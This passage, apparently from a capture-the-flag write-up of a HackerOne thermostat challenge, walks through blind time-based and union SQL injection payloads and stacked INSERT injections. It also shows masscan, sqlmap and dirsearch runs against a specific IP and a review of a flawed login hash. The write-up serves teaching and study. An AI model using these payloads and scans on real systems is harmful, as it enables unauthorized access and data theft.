class=\"o\"\u003e}\u003c/span\u003e\n\n    \u003cspan class=\"nc\"\u003ePayloadRequest\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eblindPassword\u003c/span\u003e\u003cspan class=\"o\"\u003e();\u003c/span\u003e \u003cspan class=\"c1\"\u003e// 5f4dcc3b5aa765d61d8327deb882cf99\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThere is only one user (\u0026quot;admin\u0026quot;, \u0026quot;5f4dcc3b5aa765d61d8327deb882cf99\u0026quot;). Is that a hash? \u003cu\u003eGoogled\u003c/u\u003e it and found the answer, yes it is: md5(\u0026#39;password\u0026#39;). Now we are able to log in using admin:password or even using the sqli:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight java\"\u003e\u003ccode\u003e    \u003cspan class=\"nc\"\u003eSystem\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eout\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eprintln\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003ePayloadRequest\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003esendCommand\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;admin\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;password\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;getTemp\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e));\u003c/span\u003e\n    \u003cspan class=\"c1\"\u003e// {\u0026quot;temperature\u0026quot;: 73, \u0026quot;success\u0026quot;: true}\u003c/span\u003e\n    \u003cspan class=\"nc\"\u003eSystem\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eout\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eprintln\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003ePayloadRequest\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003esendCommand\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026#39; union all select \u0026#39;47bce5c74f589f4867dbd57e9ca9f808\u0026#39;#\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;aaa\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;getTemp\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e));\u003c/span\u003e\n    \u003cspan class=\"c1\"\u003e// {\u0026quot;temperature\u0026quot;: 73, \u0026quot;success\u0026quot;: true}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eTime to dump table \u003ccode\u003edevices\u003c/code\u003e. \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight java\"\u003e\u003ccode\u003e    \u003cspan class=\"kd\"\u003epublic\u003c/span\u003e \u003cspan class=\"kd\"\u003estatic\u003c/span\u003e \u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"nf\"\u003eblindIpDevices\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003eint\u003c/span\u003e \u003cspan class=\"n\"\u003eoffset\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"kd\"\u003ethrows\u003c/span\u003e \u003cspan class=\"nc\"\u003eException\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"n\"\u003einjection\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;\u0026#39;||(IF((SELECT ascii(substr(ip,%d,1)) from devices limit \u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"n\"\u003eoffset\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;,1)%c%d,SLEEP(%d),1))#\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nc\"\u003ePayloadRequest\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eblindString\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003einjection\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e16\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e \u003cspan class=\"c1\"\u003e// Fixed length\u003c/span\u003e\n    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"o\"\u003e...\u003c/span\u003e\n    \u003cspan class=\"nc\"\u003ePayloadRequest\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eblindIpDevices\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"c1\"\u003e// Device: 0    192.88.99.253\u003c/span\u003e\n    \u003cspan class=\"nc\"\u003ePayloadRequest\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eblindIpDevices\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"c1\"\u003e// Device: 1    192.88.99.252\u003c/span\u003e\n    \u003cspan class=\"nc\"\u003ePayloadRequest\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eblindIpDevices\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"c1\"\u003e// Device: 2    10.90.120.23\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAfter obtain several ips I noted that most belonged to a private IP address block. My first idea was to build a query removing all private IP addresses and also classes D and E (see \u003ccode\u003ewhere\u003c/code\u003e clause):\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight java\"\u003e\u003ccode\u003e    \u003cspan class=\"kd\"\u003epublic\u003c/span\u003e \u003cspan class=\"kd\"\u003estatic\u003c/span\u003e \u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"nf\"\u003eblindDeviceQuery\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"kd\"\u003ethrows\u003c/span\u003e \u003cspan class=\"nc\"\u003eException\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"n\"\u003einjection\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;\u0026#39;||(IF((SELECT ascii(substr(ip,%d,1)) from devices where substr(ip,1,2) not in (\u0026#39;24\u0026#39;, \u0026#39;25\u0026#39;) and substr(ip,1,3) not in (\u0026#39;192\u0026#39;, \u0026#39;10.\u0026#39;, \u0026#39;198\u0026#39;) limit 0,1)%c%d,SLEEP(%d),1))#\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e \n        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nc\"\u003ePayloadRequest\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eblindString\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003einjection\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e16\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\n    \u003cspan class=\"nc\"\u003ePayloadRequest\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eblindDeviceQuery\u003c/span\u003e\u003cspan class=\"o\"\u003e();\u003c/span\u003e\n    \u003cspan class=\"c1\"\u003e// 104.196.12.98\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eNice! A real IP address.\u003c/p\u003e\n\n\u003ch2 id=\"server-104-196-12-98\"\u003eServer 104.196.12.98\u003c/h2\u003e\n\n\u003cp\u003eFirst recon step here is to run a port scan to discover if there is any service. As a result I got port 80 (http).\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eStarting masscan 1.0.6 (http://bit.ly/14GZzcT ) at 2019-03-02 22:32:46 GMT\n -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth\nInitiating SYN Stealth Scan\nScanning 1 hosts [65536 ports/host]\nDiscovered open port 22/tcp on 104.196.12.98\nDiscovered open port 80/tcp on 104.196.12.98\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Login.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/451/369/267d7b63eb2cf4e6851040f02de0f47766639b3f/Login.png?response-content-disposition=attachment%3B%20filename%3D%22Login.png%22%3B%20filename%2A%3DUTF-8%27%27Login.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ6J7UOFHP%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061333Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDamJ7YR2N3cIBOa8zjuSmUd9OCX8zCykCDx%2B6kH2J%2BlQIhAPFk51DuoGb47ygm%2F46VUWXIRiNzzPuAJCxpuNY6C9r8KrQDCFIQARoMMDEzNjE5Mjc0ODQ5IgwfJ9Wm2OgZB0TD5wEqkQMAyHxawucw3AMqEaVZmpdf%2FWoK6P8gu%2FCj%2FoC7vu86houcl7d5S1aesU3sbrOzgm6RSEhwz%2FFS3jL7D6T4JI4Ce1ND%2FrgO0lyXrQzDIcV61dzQW3FvNLr0ZImyyUdtac%2BXOj%2B4Yuxg3B%2Fw8%2FASrjXwhjBS66Kymk3L6dUfBdgwlGyaWjSrEj7pUe4QmHItRfpiYrIugF6V0YbiwTzCRnupZGkhFUvdnKltp%2B4hMIJ8ZpZXjRaPMFGYbJODmmGmpbXrkLNmtpD9ssAfsLLmMNbkAbfGTVhz1jb8jNtS70QChWZUcaVF%2BUJ%2BnjyviI%2BzOI3PvJo6%2BFF7nuwLNAutvngzDIQqSSVMoO%2F3MB45%2Bi7mOnnapSDDsV974XkQgCuM7vsb5p2hLCxzrxps5NEHGajQr5tkHe3qivszLUiVfsV43w8FYD%2BBONxEK7W9P8Fz8NZ67SyH7GG2ksQHMqmv0OcEaprPoRqnV3X2FUQMilKfrm8Mwo6y2b3BolwJdahB%2FiN%2B4DEDiSex%2FihlgZtj7Y4SxDDk%2FKn%2FBTrqAf559VpL8gNLdFBoVG3N%2FZOK1jnsPcfoIUSZtPAKUZCx%2FfYM8b4F5pg%2FUgEn1Lv%2B2LBdmNBasw6RmzajA5OSfdAMndyjJN9XxpB%2BQCxuWhR%2B4l3UYvcHCs0ptmeXrxe03i6oCQg6cNND1wBmViOKSrRB7ycvKEbOUFZtkHoRDVaID3Z%2BuOzyOMaLFXSvzsVsAcCFgFhIk5QJcY%2B1scZVna72pH8jnKw%2FwC1cIv1j%2FAmz0zBabFT7deSC5tUMl0pZQVYKiEGsgryYN9fSfaoMv2wR80e4kst1hVdlJHDktel9plUkLBliVB9%2BDQ%3D%3D\u0026amp;X-Amz-Signature=30bd5fe509bee9afdd92f5050b1e39d1529b55d7273791290e2e70008f8512d6\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/451/369/267d7b63eb2cf4e6851040f02de0f47766639b3f/Login.png?response-content-disposition=attachment%3B%20filename%3D%22Login.png%22%3B%20filename%2A%3DUTF-8%27%27Login.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ6J7UOFHP%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061333Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDamJ7YR2N3cIBOa8zjuSmUd9OCX8zCykCDx%2B6kH2J%2BlQIhAPFk51DuoGb47ygm%2F46VUWXIRiNzzPuAJCxpuNY6C9r8KrQDCFIQARoMMDEzNjE5Mjc0ODQ5IgwfJ9Wm2OgZB0TD5wEqkQMAyHxawucw3AMqEaVZmpdf%2FWoK6P8gu%2FCj%2FoC7vu86houcl7d5S1aesU3sbrOzgm6RSEhwz%2FFS3jL7D6T4JI4Ce1ND%2FrgO0lyXrQzDIcV61dzQW3FvNLr0ZImyyUdtac%2BXOj%2B4Yuxg3B%2Fw8%2FASrjXwhjBS66Kymk3L6dUfBdgwlGyaWjSrEj7pUe4QmHItRfpiYrIugF6V0YbiwTzCRnupZGkhFUvdnKltp%2B4hMIJ8ZpZXjRaPMFGYbJODmmGmpbXrkLNmtpD9ssAfsLLmMNbkAbfGTVhz1jb8jNtS70QChWZUcaVF%2BUJ%2BnjyviI%2BzOI3PvJo6%2BFF7nuwLNAutvngzDIQqSSVMoO%2F3MB45%2Bi7mOnnapSDDsV974XkQgCuM7vsb5p2hLCxzrxps5NEHGajQr5tkHe3qivszLUiVfsV43w8FYD%2BBONxEK7W9P8Fz8NZ67SyH7GG2ksQHMqmv0OcEaprPoRqnV3X2FUQMilKfrm8Mwo6y2b3BolwJdahB%2FiN%2B4DEDiSex%2FihlgZtj7Y4SxDDk%2FKn%2FBTrqAf559VpL8gNLdFBoVG3N%2FZOK1jnsPcfoIUSZtPAKUZCx%2FfYM8b4F5pg%2FUgEn1Lv%2B2LBdmNBasw6RmzajA5OSfdAMndyjJN9XxpB%2BQCxuWhR%2B4l3UYvcHCs0ptmeXrxe03i6oCQg6cNND1wBmViOKSrRB7ycvKEbOUFZtkHoRDVaID3Z%2BuOzyOMaLFXSvzsVsAcCFgFhIk5QJcY%2B1scZVna72pH8jnKw%2FwC1cIv1j%2FAmz0zBabFT7deSC5tUMl0pZQVYKiEGsgryYN9fSfaoMv2wR80e4kst1hVdlJHDktel9plUkLBliVB9%2BDQ%3D%3D\u0026amp;X-Amz-Signature=30bd5fe509bee9afdd92f5050b1e39d1529b55d7273791290e2e70008f8512d6\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eNow we are facing a new web application with a form consisting of \u003ccode\u003eusername\u003c/code\u003e and \u003ccode\u003epassword\u003c/code\u003e inputs. Also reading the source code (html) we can see that there is a \u003ccode\u003elogin.js\u003c/code\u003e.  Let\u0026#39;s use Burp proxy and do a request submitting the login form. What values could username and password be? From our previous SQL injection, we got admin:password. So it is a good bet:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ePOST / HTTP/1.1\nHost: 104.196.12.98\nContent-Length: 68\n\nhash=3af937e7424ef6124f8b321d73a96e737732c2f5727d25c622f6047c1a4392a\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAs we can note the post is not sending username and password but a hash. Time to see what \u003ccode\u003elogin.js\u003c/code\u003e is doing. Reading the javascript code we can spot a \u003ccode\u003ehash\u003c/code\u003e and a \u003ccode\u003efhash\u003c/code\u003e functions, leading us to understand that it is a hash algorithm. There is also some padding and XOR bit operations. Almost sure that it is really a hash function and so the backend will be unable to get the original input values (username and password).  In this scenario we can infer that the backend will also compute the hash with the same function, as \u003ccode\u003elogin.js\u003c/code\u003e, using the stored username + password. Then it will compare the two hashes. Therefore all we need to be authenticated is a hash.\u003c/p\u003e\n\n\u003cp\u003eIs it possible to be another SQL injection? Maybe another type of SQL Injection? At first, all my common payloads didn\u0026#39;t work. So in this scenario I decided to run a SQLMap [9], remembering that we are not attacking username and password input fields, but the hash. \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003e\u003cspan class=\"nv\"\u003e$ \u003c/span\u003epython sqlmap.py \u003cspan class=\"nt\"\u003e-v\u003c/span\u003e 3 \u003cspan class=\"nt\"\u003e-u\u003c/span\u003e http://104.196.12.98/ \u003cspan class=\"nt\"\u003e--data\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;hash=*\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e--level\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e5 \u003cspan class=\"nt\"\u003e--risk\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e3 \u003cspan class=\"nt\"\u003e--random-agent\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eResult: Nothing... Maybe we could find another endpoint? Time to use dirseach [7] with some wordlists from SecList [8]:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e# ./tools/dirsearch/dirsearch.py -b -t 10 -e php,asp,aspx,jsp,html,zip,jar,sql -x 500,503 -r -w wordlists/raft-large-words.txt -u http://104.196.12.98\n\n _|. _ _  _  _  _ _|_    v0.3.8\n(_||| _) (/_(_|| (_| )\n\nExtensions: php, asp, aspx, jsp, html, zip, jar, sql | Threads: 10 | Wordlist size: 119600\n\nTarget: http://104.196.12.98\n\n[15:00:31] Starting:\n[15:00:35] 302 -  209B  - /update  -\u0026gt;  http://104.196.12.98/\n[15:00:38] 302 -  209B  - /main  -\u0026gt;  http://104.196.12.98/\n[15:00:40] 302 -  209B  - /control  -\u0026gt;  http://104.196.12.98/\n[15:01:10] 302 -  209B  - /diagnostics  -\u0026gt;  http://104.196.12.98/\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eInteresting, some new endpoints to try. But unfortunately, all of them gave 302 (Found) and redirect (Location) to root (/). Therefore we need to somehow be authenticated.\u003c/p\u003e\n\n\u003cp\u003eLet\u0026#39;s focus on the hash again ...\u003c/p\u003e\n\n\u003ch3 id=\"hash\"\u003eHash\u003c/h3\u003e\n\n\u003cp\u003eIt\u0026#39;s a good decision to revisit the major hash attacks:\u003c/p\u003e\n\n\u003ch4 id=\"hash-extension-or-hash-colision\"\u003eHash Extension? or Hash Colision?\u003c/h4\u003e\n\n\u003cp\u003eCould it be a hash extension vulnerability? In short hash extension occurs \u003cem\u003ewhen a Merkle–Damgård based hash is misused as a message authentication code with construction H(secret ‖ message), and message and the length of secret is known, a length extension attack allows anyone to include extra information at the end of the message and produce a valid hash without knowing the secret\u003c/em\u003e. [10][11] In our scenario this is not applicable as there isn\u0026#39;t a signature or message authentication code to be validated.\u003c/p\u003e\n\n\u003cp\u003eOr could it be a hash colision? First of all, to be a hash colision we would need a valid hash and this is not the case here.\u003c/p\u003e\n\n\u003ch3 id=\"what-to-do-now\"\u003eWhat to do now?\u003c/h3\u003e\n\n\u003cp\u003eAt this moment I was in a hard situation. No ideas... I was sure that something important was left behind. Consequently, I decided to go back and search for more flaws or any kind of relevant information.\u003c/p\u003e\n\n\u003ch4 id=\"maybe-a-ssrf\"\u003eMaybe a SSRF?\u003c/h4\u003e\n\n\u003cp\u003eWhat if I could insert another IP into the devices table and use \u003ccode\u003esetTemp\u003c/code\u003e command to change thermostat temperature? Maybe when someone change the temperature all devices will receive a HTTP request with some authorization token and so I could use this to log in. Seems viable. First step is to try \u003ccode\u003eINSERT\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight java\"\u003e\u003ccode\u003e\u003cspan class=\"nc\"\u003eSystem\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eout\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eprintln\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003ePayloadRequest\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003esendCommand\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026#39;;INSERT INTO devices(ip) values(\u0026#39;X.X.X.X\u0026#39;); commit#\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;getTemp\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e));\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eOk, it worked. I have my IP address as a device. Now let\u0026#39;s run tcpdump [6] on my server (X.X.X.X) to capture all network traffic. Lastly, we need to send some resquests with \u003ccode\u003egetTemp\u003c/code\u003e and \u003ccode\u003esetTemp\u003c/code\u003e commands.\u003c/p\u003e\n\n\u003cp\u003e\u003ccode\u003e# tcpdump -i eth0 -nnvvXS\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eBut \u0026quot;nothing\u0026quot; happens... only a connection (port 80) from someone in San Francisco during h1-415. :) Definitively I should remove my IP address. Dead end here.\u003c/p\u003e\n\n\u003ch4 id=\"create-another-user\"\u003eCreate another user?\u003c/h4\u003e\n\n\u003cp\u003eWe are able to insert any device, maybe we can insert another user and use this as login and password for Thermostat Login.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight java\"\u003e\u003ccode\u003e\u003cspan class=\"nc\"\u003eSystem\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eout\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eprintln\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003ePayloadRequest\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003esendCommand\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026#39;;INSERT INTO users(username, password) values(\u0026#39;manoelt\u0026#39;,\u0026#39;e08e9df699ce8d223b8c9375471d6f0f\u0026#39;); commit#\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;getTemp\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e));\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eNo. We are not able to log in! :(\u003c/p\u003e\n\n\u003ch4 id=\"another-command\"\u003eAnother command?\u003c/h4\u003e\n\n\u003cp\u003eAnd if there is another parameter? Let\u0026#39;s brute force it!\u003c/p\u003e\n\n\u003cp\u003eAfter some time just popped up a \u003ccode\u003ediag\u003c/code\u003e command with the following response \u003ccode\u003e{\u0026quot;success\u0026quot;: false, \u0026quot;error\u0026quot;: \u0026quot;Missing diagnostic parameters\u0026quot;}\u003c/code\u003e. Nice, time to brute force parameters name now... After some days trying to guess the parameter for diag command using all sort of wordlists, even using cewl [13] to build specific wordlist from real Thermostats manuals, at the end nothing was found! \u003c/p\u003e\n\n\u003ch3 id=\"timing-attack\"\u003eTiming Attack\u003c/h3\u003e\n\n\u003cp\u003eMaybe I should rewrite the JS code from \u003ccode\u003elogin.js\u003c/code\u003e to python and do a code review? Ok... So while doing code review I noted something odd on JS code:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003ehash\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ex\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003ex\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u003c/span\u003e\u003cspan class=\"s1\"\u003ex01\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u003c/span\u003e\u003cspan class=\"s1\"\u003ex00\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ewhile\u003c/span\u003e\u003cspan class=\"p\"\u003e((\u003c/span\u003e\u003cspan class=\"nx\"\u003ex\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elength\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e \u003cspan class=\"mh\"\u003e0xFF\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e!=\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003ex\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"nb\"\u003eString\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003efromCharCode\u003c/span\u003e\u003cspan class=\"p\"\u003e((\u003c/span\u003e\u003cspan class=\"nx\"\u003ex\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elength\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e \u003cspan class=\"mh\"\u003e0xFF\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e^\u003c/span\u003e \u003cspan class=\"nx\"\u003ex\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003echarCodeAt\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nx\"\u003ex\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elength\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e \u003cspan class=\"mh\"\u003e0xFF\u003c/span\u003e\u003cspan class=\"p\"\u003e]);\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e...\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eCan you see it? This is a padding algorithm and the XOR operation is not working as expected, because of this:\u003c/p\u003e\n\n\u003cp\u003e\u003ccode\u003ex.charCodeAt[x.length \u0026amp; 0xFF]\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eThis is a typo and this wrong piece of code probably makes the hash function unfeasible for a correct validation on the backend server, because we won\u0026#39;t ever get the same hash value... This is a good assumption to take!\u003c/p\u003e\n\n\u003cp\u003eWhile revisting the attacks against hash functions I saw an interisting topic about Timing Attack: \u003cem\u003e\u0026quot;Comparing the hashes in 